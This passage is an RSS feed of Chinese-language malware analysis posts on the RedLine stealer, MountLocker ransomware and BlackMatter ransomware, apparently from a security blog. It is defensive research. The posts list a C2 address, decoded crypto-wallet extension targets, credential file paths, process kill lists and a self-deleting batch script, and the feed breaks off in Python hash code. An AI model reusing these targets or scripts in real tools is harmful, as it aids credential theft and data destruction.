<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Mediums on alee</title>
		<link>https://www.a1ee.cn/medium/</link>
		<description>Recent content in Mediums on alee</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-cn</language>
		<lastBuildDate>Mon, 01 Nov 2021 15:45:24 +0800</lastBuildDate>
		<atom:link href="https://www.a1ee.cn/medium/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>RedLine</title>
			<link>https://www.a1ee.cn/medium/redline/</link>
			<pubDate>Mon, 01 Nov 2021 15:45:24 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/redline/</guid>
			<description>RedLine 样本分析 1. 前言 VirusTotal样本信息 MalwareBazaar样本信息 unpacme解包文件 AnyRun检测结果 根据unpacme结</description>
			<content type="html"><![CDATA[<h1 id="redline-样本分析">RedLine 样本分析</h1>
<h2 id="1-前言">1. 前言</h2>
<p><a href="https://www.virustotal.com/gui/file/43bf339f8d440b52a1a8385223ff7c15674952c020325c5839c99a8291e97512">VirusTotal样本信息</a></p>
<p><a href="https://bazaar.abuse.ch/sample/43bf339f8d440b52a1a8385223ff7c15674952c020325c5839c99a8291e97512/">MalwareBazaar样本信息</a></p>
<p><a href="https://www.unpac.me/results/d8b3bed4-85d1-4e75-95cf-3770fd5c55cf">unpacme解包文件</a></p>
<p><a href="https://app.any.run/tasks/32858da1-fef5-4980-b3c8-65cbf7fb2504/">AnyRun检测结果</a></p>
<p>根据<code>unpacme</code>结果，逐个查看可知恶意载荷的<code>SHA256</code>为：<code>b1d6c8d2b9498001f50dab84090b9caf31f864871cfc995ffea41c22d2da9d28</code></p>
<h2 id="2-恶意程序分析">2. 恶意程序分析</h2>
<h3 id="21-cc交互">2.1. CC交互</h3>
<p>从函数入口开始分析，可以看到样本载入了配置文件：</p>
<p><img src="/redline_images/4039744161067.png" alt=""></p>
<p>后面会有动态解密过程，获取C&amp;C服务器地址端口：<code>45.9.20.182:52236</code></p>
<p><img src="/redline_images/2791422189493.png" alt=""></p>
<p>请求报文<code>header</code>格式如下：</p>
<pre><code>{&lt;Authorization xmlns=&quot;ns1&quot;&gt;a272f3a2850ec3dccdaed97234b7c40e&lt;/Authorization&gt;}
</code></pre><p><img src="/redline_images/4782429177360.png" alt=""></p>
<p>发送链接请求后等待服务器响应：</p>
<p><img src="/redline_images/2256927187529.png" alt=""></p>
<p>实例化参数列表如下：</p>
<p><img src="/redline_images/2155748091070.png" alt=""></p>
<p>实例化本地规则列表如下：</p>
<p><img src="/redline_images/4342651109496.png" alt=""></p>
<h3 id="22-主要功能">2.2. 主要功能</h3>
<p>当服务器响应后，从报文中获取参数，并根据参数内容执行对应的功能函数，但作者在实例化函数列表时，对函数名混淆了：</p>
<p><img src="/redline_images/4485152097363.png" alt=""></p>
<p>不过好在每个函数的功能很明确，逐个函数进行功能确认后，可以得出真实的功能函数列表如下：</p>
<p><img src="/redline_images/5417928180198.png" alt=""></p>
<h4 id="221-获取硬件信息">2.2.1. 获取硬件信息</h4>
<p><img src="/redline_images/3952608186753.png" alt=""></p>
<h4 id="222-获取浏览器信息">2.2.2. 获取浏览器信息</h4>
<p>会读取注册表已获取默认浏览器的信息</p>
<pre><code>SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet
SOFTWARE\\Clients\\StartMenuInternet
</code></pre><p><img src="/redline_images/255814182507.png" alt=""></p>
<h4 id="223-获取软件列表">2.2.3. 获取软件列表</h4>
<p>通过查看注册表：<code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall</code>获取软件列表，再通过<code>DisplayName</code>获取软件名；<code>DisplayVersion</code>获取软件列表：</p>
<p><img src="/redline_images/3981249200387.png" alt=""></p>
<h4 id="224-获取杀毒防护软件列表">2.2.4. 获取杀毒防护软件列表</h4>
<p>通过<code>SystemInfoHelper.GetVs()</code>函数已<code> WMI</code>查询<code>SELECT * FROM AntivirusProduct|AntiSpyWareProduct|FirewallProduct</code>，并将获取到的杀软防护软件存放在<code>ROOT\\SecurityCenter</code>和<code>ROOT\\SecurityCenter2</code>的 <code>WMI</code>命名空间中
<img src="/redline_images/1980228091142.png" alt=""></p>
<h4 id="225-获取进程列表">2.2.5. 获取进程列表</h4>
<p>通过执行<code>SELSystem.Text.RegularExpressionsECT * FRSystem.Text.RegularExpressionsOM Win32_PSystem.Text.RegularExpressionsrocess WSystem.Text.RegularExpressionshere SessSystem.Text.RegularExpressionsionId=''</code>语句获取系统进程列表信息并按照<code>ID</code>、<code>ProcessID</code>、<code>Name</code>、<code>CommandLine</code>形式存储</p>
<p><img src="/redline_images/5049521119568.png" alt=""></p>
<h4 id="226-获取本地安装的语言">2.2.6. 获取本地安装的语言</h4>
<p><img src="/redline_images/3858226107435.png" alt=""></p>
<h4 id="227-查询telegram文件">2.2.7. 查询Telegram文件</h4>
<p>如果配置文件中要求扫描<code>Telegram</code>，那么将对<code>Telegram</code>文件夹进行扫描</p>
<p><img src="/redline_images/2636727127601.png" alt=""></p>
<h4 id="228-扫描浏览器数据">2.2.8. 扫描浏览器数据</h4>
<p>如果配置文件中要求扫描浏览器，那么将执行<code>Chrome</code>、<code>Gecko</code>浏览器的数据扫描</p>
<p><img src="/redline_images/2602231120270.png" alt=""></p>
<p>其中<code>Chrome</code>浏览器将会查找<code>Login Data</code>、<code>Web Data</code>、<code>Cookies</code>路径，窃取<code>Opera GX Stable</code>、<code>Opera GX</code>、<code>AppData\\Roaming\\</code>中的浏览器数据</p>
<p><img src="/redline_images/2249334112579.png" alt=""></p>
<p><code>Gecko</code>浏览器则是窃取<code>cookies.sqlite</code>、<code>%USERPROFILE%\\AppData\\Roaming</code>目录下的浏览器数据</p>
<p><img src="/redline_images/170140130459.png" alt=""></p>
<h4 id="229-窃取文件数据">2.2.9. 窃取文件数据</h4>
<p>如果配置文件中设置了扫描文件选项，那么当接收到文件路径时，将对文件进行扫描</p>
<p><img src="/redline_images/2186948106806.png" alt=""></p>
<p>其中<code>GetFiles</code>函数覆盖了系统文件内容：<code>\\Windows\\</code>、<code>\\Program Files\\</code>、<code>\\Program Files (x86)\\</code>、<code>\\Program Data\\</code></p>
<p><img src="/redline_images/4168544125565.png" alt=""></p>
<h4 id="2210-窃取ftp数据">2.2.10. 窃取FTP数据</h4>
<p>如果配置文件中要求扫描<code>FTP</code>,则进行<code>FileZilla</code>文件扫描</p>
<p><img src="/redline_images/1806051129246.png" alt=""></p>
<p>扫描的路径是：<code>{0}\\FileZilla\\recentservers.xml</code>、<code>{0}\\FileZilla\\sitemanager.xml</code></p>
<p>窃密函数如下：</p>
<p><img src="/redline_images/5254854124382.png" alt=""></p>
<h4 id="2211-窃取加密钱包">2.2.11. 窃取加密钱包</h4>
<p>如果配置文件中要求窃取加密钱包，则会对<code>BrEx.Init</code>中已加密的钱包进行扫描</p>
<p><img src="/redline_images/858056117928.png" alt=""></p>
<p><code>BrEx.Init</code>中存储的是采用了<code>base64</code>编码的钱包字符串：</p>
<pre><code>ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoamhhamJ8WW9yb2lXYWxsZXQKaWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWN8VHJvbmxpbmsKamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWR8TmlmdHlXYWxsZXQKbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm58TWV0YW1hc2sKYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGN8TWF0aFdhbGxldApobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZHxDb2luYmFzZQpmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcHxCaW5hbmNlQ2hhaW4Kb2RiZnBlZWloZGtiaWhtb3BrYmptb29uZmFubGJmY2x8QnJhdmVXYWxsZXQKaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG58R3VhcmRhV2FsbGV0CmJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjfEVxdWFsV2FsbGV0CmNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lfEpheHh4TGliZXJ0eQpmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaXxCaXRBcHBXYWxsZXQKa25jY2hkaWdvYmdoZW5iYmFkZG9qam5uYW9nZnBwZmp8aVdhbGxldAphbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaHxXb21iYXQKZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8QXRvbWljV2FsbGV0Cm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtfE1ld0N4Cm5hbmptZGtuaGtpbmlmbmtnZGNnZ2NmbmhkYWFtbW1qfEd1aWxkV2FsbGV0Cm5rZGRnbmNkamdqZmNkZGFtZmdjbWZubGhjY25pbWlnfFNhdHVybldhbGxldApmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlY3xSb25pbldhbGxldAphaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcHxUZXJyYVN0YXRpb24KZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWJ8SGFybW9ueVdhbGxldAphZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZ3xDb2luOThXYWxsZXQKY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmt8VG9uQ3J5c3RhbApwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJua3xLYXJkaWFDaGFpbg==
</code></pre><p>解码后的数据如下：</p>
<pre><code>ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet
ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink
jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet
nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask
afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet
hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain
odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet
hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet
blnieiiffboillknjnepogjhkgnoapac|EqualWallet
cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty
fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet
kncchdigobghenbbaddojjnnaogfppfj|iWallet
amkmjjmmflddogmhpjloimipbofnfjih|Wombat
fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet
nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx
nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet
nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet
fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet
aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation
fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet
aeachknmefphepccionboohckonoeemg|Coin98Wallet
cgeeodpfagjceefieflmdfphplkenlfk|TonCrystal
pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain
</code></pre><h4 id="2212-窃取discord数据">2.2.12. 窃取Discord数据</h4>
<p>如果配置文件中要求扫描<code>Discord</code>，则会扫描<code>Discord</code>文件，<code>GetTokens()</code>函数则是获取<code>Tokens.txt</code>。</p>
<p><img src="/redline_images/2268106121062.png" alt=""></p>
<h4 id="2213-窃取steam数据">2.2.13. 窃取Steam数据</h4>
<p>如果配置文件中要求扫描<code>Steam</code>，则会调用<code>GameLauncher()</code>窃取<code>Steam</code>登录凭证</p>
<p><img src="/redline_images/2279416111592.png" alt=""></p>
<p><code>GameLauncher()</code>函数会扫描注册表<code>Software\\Valve\\Steam</code>中的<code>SteamPath</code>值获取安装路径，然后窃取<code>*ssfn*</code>、<code>config</code>、<code>*.vdf</code>文件。</p>
<h4 id="2214-窃取vpn数据">2.2.14. 窃取VPN数据</h4>
<p>如果配置文件中要求扫描<code>VPN</code>，则会对<code>NordVPN</code>、<code>OpenVPN</code>和<code>ProtonVPN</code>进行文件窃取</p>
<p><img src="/redline_images/2289828114096.png" alt=""></p>
<p>针对<code>NordVPN</code>，首先从<code>%USERPROFILE%\\AppData\\Local</code>路径扫描<code>NordVPN</code>文件夹，获取<code>user.config</code>，然后再<code>xml</code>文件中匹配<code>//setting[@name=\\Username\\]/value</code>和<code>//setting[@name=\\Password\\]/value</code>窃取用户密码，然后采用内置的解密函数<code>CryptoHelper.DecryptBlob</code>进行解密：</p>
<p><img src="/redline_images/3529732123043.png" alt=""></p>
<p>针对<code>OpenVPN</code>，首先从<code>%USERPROFILE%\\AppData\\Roaming</code>路径扫描<code>OpenVPN Connect</code>文件夹，进入<code>profiles</code>文件夹，然后扫描<code>npvo*</code>文件；</p>
<p>针对<code>ProtonVPN</code>，首先从<code>%USERPROFILE%\\AppData\\Local</code>路径扫描<code>ProtonVPN</code>文件夹，然后扫描<code>npvo*</code>文件。</p>
<h4 id="2215-截取屏幕">2.2.15. 截取屏幕</h4>
<p>如果配置中要求截取屏幕，则调用<code>GdiHelper.GetImageBase()</code>函数截取屏幕</p>
<p><img src="/redline_images/4231349145928.png" alt=""></p>
<h4 id="2216-获取用户名">2.2.16. 获取用户名</h4>
<p>直接调用系统<code>API</code>获取用户名</p>
<p><img src="/redline_images/1307955146537.png" alt=""></p>
<h4 id="2217-获取显示器大小">2.2.17. 获取显示器大小</h4>
<p>调用<code>GdiHelper.MonitorSize()</code>函数以获取显示器长宽大小</p>
<p><img src="/redline_images/4828655173492.png" alt=""></p>
<h4 id="2218-获取系统版本">2.2.18. 获取系统版本</h4>
<p>调用<code>SystemInfoHelper.GetWindowsVersion()</code>函数查询注册表：<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion</code>，以获取用户系统版本信息</p>
<p><img src="/redline_images/285659145003.png" alt=""></p>
<h4 id="2219-获取自身路径">2.2.19. 获取自身路径</h4>
<p>调用系统<code>API</code>获取当前运行路径</p>
<p><img src="/redline_images/45700151254.png" alt=""></p>
<h4 id="2220-获取硬件id">2.2.20. 获取硬件ID</h4>
<p>根据当前用户关联的网络域名、当前线程相关联的用户名和<code>Win32_DiskDrive</code>对象信息计算<code>MD5</code>生成<code>HardwareID</code></p>
<p><img src="/redline_images/2406200151393.png" alt=""></p>
<h4 id="2221-获取时区">2.2.21. 获取时区</h4>
<p>调用系统<code>API</code>获取主机所在的时区信息</p>
<p><img src="/redline_images/1418309163483.png" alt=""></p>
<h3 id="23-发送详情">2.3. 发送详情</h3>
<p>当获取到上述数据后，会调用<code>Send()</code>函数，将扫描的详情进行填充，</p>
<p><img src="/redline_images/5122110168522.png" alt=""></p>
<p>其中<code>PartsSender.GetLocalInfo()</code>函数，会在主机上访问<code>http://733s.komawai.ru/</code>，该链接将返回主机的相关信息：</p>
<pre><code>{&quot;city&quot;:&quot;***&quot;,&quot;country_code&quot;:&quot;***&quot;,&quot;postal&quot;:null,&quot;ip&quot;:&quot;*.*.*.*&quot;}
</code></pre><p>解析上述<code>json</code>文件，填充到发送请求中：</p>
<p><img src="/redline_images/1305416169817.png" alt=""></p>
<h3 id="24-远程下载">2.4. 远程下载</h3>
<p>当上述的发送请求结束，将会调用<code>TaskResolver()</code>函数</p>
<p><img src="/redline_images/4939619170819.png" alt=""></p>
<p>该函数有四个方法：<code>CommandLineUpdate()</code>、<code>DownloadUpdate()</code>、<code>DownloadAndExecuteUpdate()</code>、<code>OpenUpdate()</code></p>
<p><img src="/redline_images/3430930172827.png" alt=""></p>
<p><code>DownloadAndExecuteUpdate()</code>函数采用<code>WebClient().DownloadFile()</code>下载文件，并使用<code>System.Diagnostics.Process.Start()</code>运行</p>
<p><img src="/redline_images/2031022156548.png" alt=""></p>
]]></content>
		</item>
		
		<item>
			<title>MountLocker</title>
			<link>https://www.a1ee.cn/medium/mountlocker/</link>
			<pubDate>Mon, 01 Nov 2021 15:45:13 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/mountlocker/</guid>
			<description>MountLocker 样本分析 样本信息 样本来源：MALWAREbazaar 相关报告：VirusTotal扫描报告 样本md5：3808F21E56DEDE99BC</description>
			<content type="html"><![CDATA[<h1 id="mountlocker-样本分析">MountLocker 样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p>样本来源：<a href="https://bazaar.abuse.ch/sample/4a5ac3c6f8383cc33c795804ba5f7f5553c029bbb4a6d28f1e4d8fb5107902c1/">MALWAREbazaar</a></p>
<p>相关报告：<a href="https://www.virustotal.com/gui/file/4a5ac3c6f8383cc33c795804ba5f7f5553c029bbb4a6d28f1e4d8fb5107902c1/detection">VirusTotal扫描报告</a></p>
<p>样本md5：3808F21E56DEDE99BC914D90AEABE47A</p>
<p>样本sha256：4A5AC3C6F8383CC33C795804BA5F7F5553C029BBB4A6D28F1E4D8FB5107902C1</p>
<h2 id="行为结果">行为结果</h2>
<p>运行样本后，样本首先将对硬盘内的文件进行遍历，对部分文件进行加密，并以<code>ReadManual.***</code>后缀结尾、创建日志文件和恢复说明<code>html</code>。</p>
<p><img src="/mountlocker_images/4442910100867.png" alt=""></p>
<p><code>MountLocker.exe.log</code>日志文件（精简了DEFAULT LOCK部分）如下：</p>
<p><img src="/mountlocker_images/1911120119293.png" alt=""></p>
<p><code>RecoveryManual.html</code>恢复说明文件内容如下：</p>
<p><img src="/mountlocker_images/352923107160.png" alt=""></p>
<h2 id="静态分析">静态分析</h2>
<h3 id="参数获取">参数获取</h3>
<p>样本的第一个函数就是处理命令参数的函数，进来后可以看到一连串的参数匹配：</p>
<p><img src="/mountlocker_images/3729710160867.png" alt=""></p>
<h3 id="创建日志文件">创建日志文件</h3>
<p>参数获取完成后，进入下一个函数内，该函数首先判断用户权限，然后获取样本路径，直接在该路径后添加<code>.log</code>创建日志文件：</p>
<p><img src="/mountlocker_images/3077115090872.png" alt=""></p>
<h3 id="写入系统信息">写入系统信息</h3>
<p>读取<code>console</code>参数，决定是否终端显示日志，然后向日志文件写入当前版本及系统信息：</p>
<p><img src="/mountlocker_images/632409189294.png" alt=""></p>
<h3 id="初始化">初始化</h3>
<p><code>LockerInit()</code>将初始化恶意程序，提升权限、生成密钥</p>
<p><img src="/mountlocker_images/643420097165.png" alt=""></p>
<p>然后生成<code>RecoveryManual.html</code>：
<img src="/mountlocker_images/2441221117331.png" alt=""></p>
<h3 id="终止服务">终止服务</h3>
<p>如果未输入<code>network</code>且未输入<code>nokill</code>参数，则杀死指定服务</p>
<p><img src="/mountlocker_images/5803501119297.png" alt=""></p>
<p>服务列表为：包含字符串<code>SQL</code>、<code>database</code>、<code>msexchange</code>的服务</p>
<p><img src="/mountlocker_images/5359453090871.png" alt=""></p>
<h3 id="终止进程">终止进程</h3>
<p>使用<code>ZwQuerySystemInformation</code>获取当前进程列表。</p>
<p><img src="/mountlocker_images/3669117107164.png" alt=""></p>
<p>然后进行列表比对，杀死指定进程</p>
<p><img src="/mountlocker_images/2802719119999.png" alt=""></p>
<p>进程列表如下：</p>
<pre><code>&quot;msftesql.exe&quot;、&quot;sqlagent.exe&quot;、&quot;sqlbrowser.exe&quot;、&quot;sqlwriter.exe&quot;、&quot;oracle.exe&quot;、&quot;ocssd.exe&quot;、&quot;dbsnmp.exe&quot;、&quot;synctime.exe&quot;、&quot;agntsvc.exe&quot;、&quot;isqlplussvc.exe&quot;、&quot;xfssvccon.exe&quot;、&quot;sqlservr.exe&quot;、&quot;mydesktopservice.exe&quot;、&quot;ocautoupds.exe&quot;、&quot;encsvc.exe&quot;、&quot;firefoxconfig.exe&quot;、&quot;tbirdconfig.exe&quot;、&quot;mydesktopqos.exe&quot;、&quot;ocomm.exe&quot;、&quot;mysqld.exe&quot;、&quot;mysqld-nt.exe&quot;、&quot;mysqld-opt.exe&quot;、&quot;dbeng50.exe&quot;、&quot;sqbcoreservice.exe&quot;、&quot;excel.exe&quot;、&quot;infopath.exe&quot;、&quot;msaccess.exe&quot;、&quot;mspub.exe&quot;、&quot;onenote.exe&quot;、&quot;outlook.exe&quot;、&quot;powerpnt.exe&quot;、&quot;sqlservr.exe&quot;、&quot;thebat.exe&quot;、&quot;steam.exe&quot;、&quot;thebat64.exe&quot;、&quot;thunderbird.exe&quot;、&quot;visio.exe&quot;、&quot;winword.exe&quot;、&quot;wordpad.exe&quot;、&quot;QBW32.exe&quot;、&quot;QBW64.exe&quot;、&quot;ipython.exe&quot;、&quot;wpython.exe&quot;、&quot;python.exe&quot;、&quot;dumpcap.exe&quot;、&quot;procmon.exe&quot;、&quot;procmon64.exe&quot;、&quot;procexp.exe&quot;、&quot;procexp64.exe&quot;
</code></pre><p><img src="/mountlocker_images/4202625116554.png" alt=""></p>
<h3 id="加密文件">加密文件</h3>
<p>根据<code>/NOLOCK</code>参数，选择加密函数，默认是执行第一条：</p>
<p><img src="/mountlocker_images/4206518165366.png" alt=""></p>
<p>进入加密功能函数，首先是做驱动器判断：</p>
<p><img src="/mountlocker_images/761020146607.png" alt=""></p>
<h4 id="加密文件列表获取">加密文件列表获取</h4>
<p>扫描文件列表时，将进行文件夹名称和文件名判断，如果文件夹中未包含<code>RecoveryManual.html</code>则创建：</p>
<p><img src="/mountlocker_images/5237357100944.png" alt=""></p>
<p><code>ResultCheckDir</code>文件夹检查，如果满足以下要求，则跳过该文件夹（保留基础服务）：</p>
<p><img src="/mountlocker_images/2884701155729.png" alt=""></p>
<p>查看<code>off_14000A100</code>内容得出<code>black_list</code>文件列表如下：</p>
<pre><code>&quot;:\\Windows\\&quot;,&quot;:\\System Volume Information\\&quot;,&quot;:\\$RECYCLE.BIN\\&quot;,&quot;:\\SYSTEM.SAV&quot;,&quot;:\\WINNT&quot;,&quot;:\\$WINDOWS.~BT\\&quot;,&quot;:\\Windows.old\\&quot;,&quot;:\\PerfLog\\&quot;,&quot;:\\Boot&quot;,&quot;:\\ProgramData\\Microsoft\\&quot;,&quot;:\\ProgramData\\Packages\\&quot;,&quot;$\\Windows\\&quot;,&quot;$\\System Volume Information\\&quot;,&quot;$\\$RECYCLE.BIN\\&quot;,&quot;$\\SYSTEM.SAV&quot;,&quot;$\\WINNT&quot;,&quot;$\\$WINDOWS.~BT\\&quot;,&quot;$\\Windows.old\\&quot;,&quot;$\\PerfLog\\&quot;,&quot;$\\Boot&quot;,&quot;$\\ProgramData\\Microsoft\\&quot;,&quot;$\\ProgramData\\Packages\\&quot;,&quot;\\WindowsApps\\&quot;,&quot;\\Microsoft\\Windows\\&quot;,&quot;\\Local\\Packages\\&quot;,&quot;\\Windows Defender&quot;,&quot;\\microsoft shared\\&quot;,&quot;\\Google\\Chrome\\&quot;,&quot;\\Mozilla Firefox\\&quot;,&quot;\\Mozilla\\Firefox\\&quot;,&quot;\\Internet Explorer\\&quot;,&quot;\\MicrosoftEdge\\&quot;,&quot;\\Tor Browser\\&quot;,&quot;\\AppData\\Local\\Temp\\&quot;
</code></pre><p>数据文件夹<code>&quot;Program Files&quot;</code>，<code>&quot;Program Files (x86)&quot;</code>，<code>&quot;ProgramData&quot;</code>，<code>&quot;SQL&quot;</code>：</p>
<p><img src="/mountlocker_images/2166505156338.png" alt=""></p>
<p><code>ResultCheckFile</code>文件名检查如下，如果文件小于最小，大于最大，或者是指定后缀名则跳过该文件：</p>
<p><img src="/mountlocker_images/4876024154804.png" alt=""></p>
<p>后缀名检查如下：</p>
<p><img src="/mountlocker_images/5143325151055.png" alt=""></p>
<p>查看数组可知<code>suffix_list</code>如下：</p>
<pre><code>&quot;exe&quot;,&quot;dll&quot;,&quot;sys&quot;,&quot;msi&quot;,&quot;mui&quot;,&quot;inf&quot;,&quot;cat&quot;,&quot;bat&quot;,&quot;cmd&quot;,&quot;ps1&quot;,&quot;vbs&quot;,&quot;ttf&quot;,&quot;fon&quot;,&quot;lnk&quot;
</code></pre><p>然后扫描文件，以<code>FindFirstFileW</code>和<code>FindNextFileW</code>来查找文件， 循环调用以确保所有文件夹都被扫描到：</p>
<p><img src="/mountlocker_images/1884021169047.png" alt=""></p>
<h4 id="文件加密流程">文件加密流程</h4>
<p>采用多线程启动加密主函数：</p>
<p><img src="/mountlocker_images/2889733164183.png" alt=""></p>
<p>再多线程对目标进行加密：</p>
<p><img src="/mountlocker_images/1930634157729.png" alt=""></p>
<p>将加密文件重命名成固定格式：</p>
<p><img src="/mountlocker_images/708036150863.png" alt=""></p>
<p>加密好密钥，然后将内容写入到文件中：</p>
<p><img src="/mountlocker_images/4889737141393.png" alt=""></p>
<p>接着重新读取文件并加密：</p>
<p><img src="/mountlocker_images/653843143897.png" alt=""></p>
<h3 id="蠕虫攻击">蠕虫攻击</h3>
<p>如果<code>/NETWORK</code>参数不为空，则启动蠕虫攻击：</p>
<p><img src="/mountlocker_images/1950341169370.png" alt=""></p>
<p>蠕虫函数运行前会创建线程，等待事件：</p>
<p><img src="/mountlocker_images/4849842157237.png" alt=""></p>
<p>然后会在域内寻找<code>LDAP</code>服务器：</p>
<p><img src="/mountlocker_images/2093647177403.png" alt=""></p>
<p>当检查存在主机时，添加事件到线程中去：</p>
<p><img src="/mountlocker_images/5563848166627.png" alt=""></p>
<p>事件将链接目标主机，然后进行蠕虫行为：
<img src="/mountlocker_images/5761449162381.png" alt=""></p>
<p>首先会复制自身到<code>C:\\ProgramData</code>目录下：</p>
<p><img src="/mountlocker_images/1250253177865.png" alt=""></p>
<p>根据<code>NetworkFlag</code>的不同，选择不同的方式：</p>
<p><img src="/mountlocker_images/5054254175367.png" alt=""></p>
<p>第一种方式是<code>CreateServiceW</code>：</p>
<p><img src="/mountlocker_images/5240655156608.png" alt=""></p>
<p>第二种方式是<code>WMI</code>（由于技术实力不达标，未看明白函数主体，但从上下文结构和错误提示信息得出方式）：</p>
<p><img src="/mountlocker_images/2959659179048.png" alt=""></p>
<h3 id="自我删除">自我删除</h3>
<p>在蠕虫攻击结束后，退出前的最后一个函数是自我删除函数：</p>
<p><img src="/mountlocker_images/4854100184184.png" alt=""></p>
<p>创建一个<code>bat</code>文件，取消文件系统、只读、隐藏属性，安静模式强制删除文件</p>
<pre><code>attrib -s -r -h %1
:l
del /F /Q %1
if exist %1 goto l
del %0
</code></pre><p>在最后将利用<code>CreateProcessW</code>删除自身</p>
]]></content>
		</item>
		
		<item>
			<title>BlackMatter</title>
			<link>https://www.a1ee.cn/medium/blackmatter/</link>
			<pubDate>Mon, 18 Oct 2021 16:13:48 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/blackmatter/</guid>
			<description>BlackMatter 勒索软件分析 1. 前言 一个新的勒索软件团伙BlackMatter于 2021 年 7 月在地下论坛/Exploit/和/XSS/上招募附属机构。他们填补了在</description>
			<content type="html"><![CDATA[<h1 id="blackmatter-勒索软件分析">BlackMatter 勒索软件分析</h1>
<h2 id="1-前言">1. 前言</h2>
<p>一个新的勒索软件团伙<code>BlackMatter</code>于 2021 年 7 月在地下论坛<code>/Exploit/</code>和<code>/XSS/</code>上招募附属机构。他们填补了在 Colonial Pipeline 攻击后<code>DarkSide</code>关闭以及<code>REvil</code>在 7 月中旬击败 Kaseya 后消失所留下的空白。该团伙表示：他们既不是<code>DarkSide</code>也不是<code>REvil</code>的继任者。宣称<code>BlackMatter</code>是将勒索软件<code>LockBit</code>、<code>REvil</code>和<code>DarkSide</code>各自的优势结合起来的最好的勒索软件。</p>
<p><strong>IOC</strong></p>
<blockquote>
<p>SHA256 : 22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6</p>
</blockquote>
<p>你可以在<a href="https://bazaar.abuse.ch/sample/22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6/">MalwareBazaar</a>下载。</p>
<p><strong>赎金票据</strong></p>
<p>勒索信的内容在<code>BlackMatter</code>的配置中进行了加密，并动态解密写入到每个目录的勒索信文件中。赎金票据文件名的形式为：<code>**.README.txt</code></p>
<p><img src="/blackmatter_images/2892754090964.png" alt=""></p>
<h2 id="2-动态解析api">2. 动态解析API</h2>
<p>因为结合了诸多勒索软件的优点，那么动态解析API和基本的字符串加密是必不可少的，接下来就让我们来看看它到底是怎么做的。</p>
<p>IDA打开样本，首先便是动态解析API，函数如下：</p>
<p><img src="/blackmatter_images/2754708160965.png" alt=""></p>
<h3 id="21-哈希计算">2.1. 哈希计算</h3>
<p>实际调用是使用<code>Get_Func_Addr_By_ROR13_Hash</code>导入API函数的hash进行函数加载。<code>Get_Func_Addr_By_ROR13_Hash</code>函数中可以看到首先确保<code>LoadLibraryA</code>和<code>GetProcAddress</code>已加载，然后再进行hash比对：</p>
<p><img src="/blackmatter_images/1080120167258.png" alt=""></p>
<p><code>hash</code>计算采用了循环右移<code>0xD</code>位的方式，<code>Get_Dll_Name_Hash</code>函数内容如下：</p>
<p><img src="/blackmatter_images/1502623187424.png" alt=""></p>
<p>采用<code>python</code>代码重写就美观了许多：</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">):</span>
    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">dll_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
